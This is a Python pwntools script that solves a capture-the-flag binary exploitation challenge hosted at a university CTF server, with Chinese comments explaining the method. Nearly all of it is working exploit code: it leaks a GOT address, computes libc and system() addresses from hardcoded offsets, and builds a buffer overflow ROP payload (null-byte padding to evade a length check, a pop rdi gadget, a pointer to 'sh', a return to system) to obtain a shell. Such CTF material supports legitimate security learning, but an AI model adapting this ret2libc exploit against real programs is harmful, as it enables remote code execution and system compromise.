#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import time
import sys
host="ctf.adl.csie.ncu.edu.tw"
port="11006"

#host = "127.0.0.1"
#port = "8891"

r=remote(host,port)

pop_rdi = p64(0x400873)
#pop_rdi = p64(0x4007d3)
sh =p64(0x7ffff7a22c37)


print(int('0x601028',16))
print_got = int('0x601028',16)
print print_got
print(r.recvuntil(":"))
r.sendline(str(print_got))
print(r.recvuntil("is "))
print("\n")


local_offset_system =0x46590
local_offset_print =0x54340

print_address=int(r.recv(14),16)
#print('r.recv:',r.recv(14))
offset_print=0x557b0
libc = print_address-offset_print
offset_system=0x45380
system=libc+offset_system

print('print address:',hex(print_address))
print('print libc:',hex(libc))
print('print system',hex(system))
print('address:',print_address)

payload='\x00\x00\x00\x00\x00\x00\x00\x00' + 'a'*32 + pop_rdi + sh + p64(system)
#前面鋪0 可以躲過字串長度的檢查
#之後leak print的位址，算出system的位址，然後buffer overflow ，
# 一個小rop把sh的位址(可以用gdb找到sh的位址)塞到rdi， 並return 到 system 
#print(r.recvuntil("\n"))
#r.sendline(payload)
#r.sendline(payload)
#time.sleep(120)
#348

#p64可以把一個64進位的位址值打包成\x形式的string
#r.sendline(payload)


file = open('in', 'w')
file.write(payload)
file.close()
r.interactive()
